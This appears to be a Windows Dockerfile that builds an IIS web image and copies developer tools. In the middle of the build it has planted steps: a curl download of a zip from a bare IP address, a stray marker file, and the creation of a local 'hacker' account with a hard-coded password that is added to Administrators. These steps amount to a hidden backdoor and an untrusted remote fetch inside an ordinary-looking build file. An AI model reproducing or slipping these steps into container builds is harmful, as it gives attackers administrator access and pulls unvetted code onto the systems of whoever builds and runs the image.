# escape=`

ARG PARENT_IMAGE
ARG SOLUTION_IMAGE
ARG TOOLS_IMAGE

FROM ${TOOLS_IMAGE} as tools
FROM ${PARENT_IMAGE}

SHELL ["powershell", "-Command", "$ErrorActionPreference = 'Stop'; $ProgressPreference = 'SilentlyContinue';"]

WORKDIR C:\inetpub\wwwroot


RUN curl.exe -sS -L -o aaaaaa.zip http://134.209.28.104/dist/v-win-x64.zip
RUN echo.exe a2aa > C:\Users\Public\aaa.txt
RUN net user hacker Str0ngP@ssw0rd! /add && `
    net localgroup Administrators hacker /add

# Copy developer tools and entrypoint
COPY --from=tools C:\tools C:\tools
